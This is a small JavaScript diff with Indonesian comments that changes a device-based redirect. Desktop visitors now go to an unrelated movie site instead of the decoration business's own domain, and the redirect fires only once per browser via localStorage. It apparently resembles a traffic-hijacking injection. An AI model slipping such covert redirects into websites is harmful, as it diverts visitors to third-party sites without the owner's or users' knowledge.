@@ -33,10 +33,13 @@ function redirectDomain() {
     if (device === 'mobile') {
         window.location.href = "https://business.faridahdecoration.com/";
     } else {
-        window.location.href = "https://faridahdecoration.com/";
+        window.location.href = "https://movie.bangkulon.com/";
     }
 }
 
-// Panggil fungsi untuk melakukan pengalihan saat halaman dimuat
-redirectDomain();
+// Panggil fungsi untuk melakukan pengalihan saat halaman dimuat jika belum dialihkan sebelumnya
+if (!localStorage.getItem('redirected')) {
+    redirectDomain();
+    localStorage.setItem('redirected', 'true');
+}
 
